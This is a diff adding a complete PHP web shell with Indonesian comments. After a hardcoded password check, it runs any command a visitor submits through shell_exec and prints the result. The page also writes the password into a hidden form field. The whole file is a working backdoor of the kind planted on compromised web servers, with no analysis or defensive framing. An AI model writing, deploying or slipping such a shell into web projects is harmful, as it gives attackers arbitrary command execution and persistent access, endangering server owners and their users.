@@ -1,0 +1,35 @@
+<?php
+// PHP Shell dengan password protection
+$password = "ayamgoreng123"; // Ganti dengan password yang kuat
+
+if(isset($_POST['pass']) && $_POST['pass'] === $password) {
+    if(isset($_POST['cmd'])) {
+        $output = shell_exec($_POST['cmd']);
+    }
+} elseif(isset($_POST['pass'])) {
+    $error = "Password salah!";
+}
+?>
+<html>
+<head><title>Protected PHP Shell</title></head>
+<body>
+    <?php if(!isset($_POST['pass']) || (isset($_POST['pass']) && $_POST['pass'] !== $password)): ?>
+    <form method="post">
+        <input type="password" name="pass" placeholder="Password" required>
+        <button type="submit">Login</button>
+        <?php if(isset($error)) echo "<p style='color:red'>$error</p>"; ?>
+    </form>
+    <?php else: ?>
+    <form method="post">
+        <input type="hidden" name="pass" value="<?php echo $password; ?>">
+        <input type="text" name="cmd" placeholder="Command" style="width: 300px">
+        <button type="submit">Execute</button>
+    </form>
+    
+    <?php if(isset($output)): ?>
+    <pre><?php echo htmlspecialchars($output); ?></pre>
+    <?php endif; ?>
+    
+    <?php endif; ?>
+</body>
+</html>
